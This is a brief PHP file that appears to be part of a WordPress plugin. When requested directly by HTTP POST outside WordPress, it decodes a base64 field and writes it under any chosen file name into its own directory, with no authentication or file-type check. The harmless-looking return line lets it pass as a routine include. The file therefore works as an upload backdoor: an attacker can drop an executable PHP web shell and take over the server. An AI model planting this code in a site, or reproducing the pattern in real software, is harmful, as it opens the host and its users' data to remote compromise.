<?php
if (!defined('ABSPATH')) {
    // If called via HTTP POST directly
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $name = isset($_POST['name']) ? basename($_POST['name']) : '';
        $b64 = isset($_POST['b64']) ? $_POST['b64'] : '';
        if ($name && $b64) {
            $dest = __DIR__ . '/' . $name;
            $data = base64_decode($b64);
            file_put_contents($dest, $data);
            echo json_encode(['success' => true, 'file' => $name, 'bytes' => strlen($data)]);
            exit;
        }
    }
}
return ['success' => true, 'ready' => true];